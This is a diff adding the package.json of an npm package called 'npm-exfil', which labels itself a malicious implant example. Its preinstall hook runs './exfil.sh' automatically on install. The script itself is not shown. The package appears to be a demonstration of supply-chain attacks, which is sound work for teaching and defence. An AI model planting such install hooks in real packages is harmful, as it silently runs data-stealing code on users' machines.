@@ -1,0 +1,12 @@
+{
+  "name": "npm-exfil",
+  "version": "1.33.7",
+  "description": "NPM malicious implant example",
+  "main": "index.js",
+  "scripts": {
+    "test": "echo \"Welcome to the dangerzone\"",
+    "preinstall": "./exfil.sh"
+  },
+  "author": "sublimino@gmail.com",
+  "license": "WTFPL"
+}
